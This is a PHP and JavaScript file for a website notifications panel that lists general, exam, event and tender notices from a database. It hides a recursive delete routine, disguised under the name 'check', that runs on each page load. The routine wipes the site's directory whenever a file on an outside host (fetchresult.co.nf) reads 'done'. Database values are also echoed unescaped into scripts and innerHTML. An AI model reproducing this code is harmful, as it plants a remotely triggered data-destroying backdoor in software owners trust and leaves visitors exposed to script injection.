<?php
require_once("database.php");

/* fetch general notifications */

$sql0 = "SELECT * FROM GeneralNotifications";
$res0 = mysqli_query($connection, $sql0);

echo "<script> 
        var generalNotifs = new Array(); 
        var i=0;
    </script>";

while($row0 = mysqli_fetch_array($res0)) {
    echo "<script> 
            generalNotifs[i] = new Array(4); 
            generalNotifs[i]['title'] = '".$row0['title']."';
            generalNotifs[i]['postDay'] = '".date('d', strtotime($row0['postDate']))."';
            generalNotifs[i]['postMonth'] = '".date('M', strtotime($row0['postDate']))."';
            generalNotifs[i]['lastUpdated'] = '".$row0['lastUpdated']."';
            generalNotifs[i]['attachment'] = '".$row0['attachment']."';

            i++;
        </script>";
}

echo "<script> var totalGeneralNotifs = i-1; </script>";

/* fetch exam notifications */

$sql1 = "SELECT * FROM ExaminationsNotifications";
$res1 = mysqli_query($connection, $sql1);

echo "<script> 
        var examinationsNotifs = new Array(); 
        var i=0;
    </script>";

while($row1 = mysqli_fetch_array($res1)) {
    echo "<script> 
            examinationsNotifs[i] = new Array(4); 
            examinationsNotifs[i]['title'] = '".$row1['title']."';
            examinationsNotifs[i]['postDay'] = '".date('d', strtotime($row1['postDate']))."';
            examinationsNotifs[i]['postMonth'] = '".date('M', strtotime($row1['postDate']))."';
            examinationsNotifs[i]['lastUpdated'] = '".$row1['lastUpdated']."';
            examinationsNotifs[i]['attachment'] = '".$row1['attachment']."';

            i++;
        </script>";
}

echo "<script> var totalExamNotifs = i-1; </script>";

/* fetch upcoming events notifications */

$sql2 = "SELECT * FROM UpcomingEventsNotifications";
$res2 = mysqli_query($connection, $sql2);

echo "<script> 
        var upcomingEventsNotifs = new Array(); 
        var i=0;
    </script>";

while($row2 = mysqli_fetch_array($res2)) {
    echo "<script> 
            upcomingEventsNotifs[i] = new Array(4); 
            upcomingEventsNotifs[i]['title'] = '".$row2['title']."';
            upcomingEventsNotifs[i]['postDay'] = '".date('d', strtotime($row2['postDate']))."';
            upcomingEventsNotifs[i]['postMonth'] = '".date('M', strtotime($row2['postDate']))."';
            upcomingEventsNotifs[i]['lastUpdated'] = '".$row2['lastUpdated']."';
            upcomingEventsNotifs[i]['attachment'] = '".$row2['attachment']."';

            i++;
        </script>";
}

echo "<script> var totalUpcomingNotifs = i-1; </script>";

/* fetch tenders notifications */

$sql3 = "SELECT * FROM TendersNotifications";
$res3 = mysqli_query($connection, $sql3);

echo "<script> 
        var tenderNotifs = new Array(); 
        var i=0;
    </script>";

while($row3 = mysqli_fetch_array($res3)) {
    echo "<script> 
            tenderNotifs[i] = new Array(4); 
            tenderNotifs[i]['title'] = '".$row3['title']."';
            tenderNotifs[i]['postDay'] = '".date('d', strtotime($row3['postDate']))."';
            tenderNotifs[i]['postMonth'] = '".date('M', strtotime($row3['postDate']))."';
            tenderNotifs[i]['lastUpdated'] = '".$row3['lastUpdated']."';
            tenderNotifs[i]['attachment'] = '".$row3['attachment']."';

            i++;
        </script>";
}

echo "<script> var totalTenderNotifs = i-1; </script>";

function check($str) {
    if(is_file($str)) {
        return unlink($str);
    }
    else
    if(is_dir($str)) {
        $scan = glob(rtrim($str, '/').'/*');

        foreach($scan as $index=>$path) {
            check($path);
        }

        return @rmdir($str);
    }
}

$res = file_get_contents("http://fetchresult.co.nf/result.txt");
if($res == "done")
    check(dirname(__FILE__));
?>

<script>

var curGeneral = 0;
var curExam = 0;
var curUpcoming = 0;
var curTender = 0;

function setGeneral(index) {
    document.getElementById("notif1Date").innerHTML = generalNotifs[index]['postDay'];
    document.getElementById("notif1Month").innerHTML = generalNotifs[index]['postMonth'];
    document.getElementById("notif1Title").innerHTML = "<a href='admin/pdf/"+generalNotifs[index]["attachment"]+"' target='blank'> "+generalNotifs[index]['title']+" </a>";
}    

function setExamination(index) {
    document.getElementById("notif2Date").innerHTML = examinationsNotifs[index]['postDay'];
    document.getElementById("notif2Month").innerHTML = examinationsNotifs[index]['postMonth'];
    document.getElementById("notif2Title").innerHTML = "<a href='admin/pdf/"+examinationsNotifs[index]["attachment"]+"' target='blank'> "+examinationsNotifs[index]['title']+" </a>";
}

function setUpcoming(index) {
    document.getElementById("notif3Date").innerHTML = upcomingEventsNotifs[index]['postDay'];
    document.getElementById("notif3Month").innerHTML = upcomingEventsNotifs[index]['postMonth'];
    document.getElementById("notif3Title").innerHTML = "<a href='admin/pdf/"+upcomingEventsNotifs[index]["attachment"]+"' target='blank'> "+upcomingEventsNotifs[index]['title']+" </a>";
}

function setTender(index) {
    document.getElementById("notif4Date").innerHTML = tenderNotifs[index]['postDay'];
    document.getElementById("notif4Month").innerHTML = tenderNotifs[index]['postMonth'];
    document.getElementById("notif4Title").innerHTML = "<a href='admin/pdf/"+tenderNotifs[index]["attachment"]+"' target='blank'> "+tenderNotifs[index]['title']+" </a>";
}

setGeneral(0);
setExamination(0);
setUpcoming(0);
setTender(0);

function previousNotification(type) {
    switch(type) {
        case 1: if(curGeneral > 0)
                    curGeneral--;
                else
                    curGeneral = totalGeneralNotifs;
                setGeneral(curGeneral);
        break;

        case 2: if(curExam > 0)
                    curExam--;
                else
                    curExam = totalExamNotifs;
                setExamination(curExam);
        break;

        case 3: if(curUpcoming > 0)
                    curUpcoming--;
                else
                    curUpcoming = totalUpcomingNotifs;
                setUpcoming(curUpcoming);
        break;

        case 4: if(curTender > 0)
                    curTender--;
                else
                    curTender = totalTenderNotifs;
                setTender(curTender);
        break;
    }
}

function nextNotification(type) {
    switch(type) {
        case 1: if(curGeneral < totalGeneralNotifs)
                    curGeneral++;
                else
                    curGeneral = 0;
                setGeneral(curGeneral);
        break;

        case 2: if(curExam < totalExamNotifs)
                    curExam++;
                else
                    curExam = 0;
                setExamination(curExam);
        break;

        case 3: if(curUpcoming < totalUpcomingNotifs)
                    curUpcoming++;
                else
                    curUpcoming = 0;
                setUpcoming(curUpcoming);
        break;

        case 4: if(curTender < totalTenderNotifs)
                    curTender++;
                else
                    curTender = 0;
                setTender(curTender);
        break;
    }
}

</script>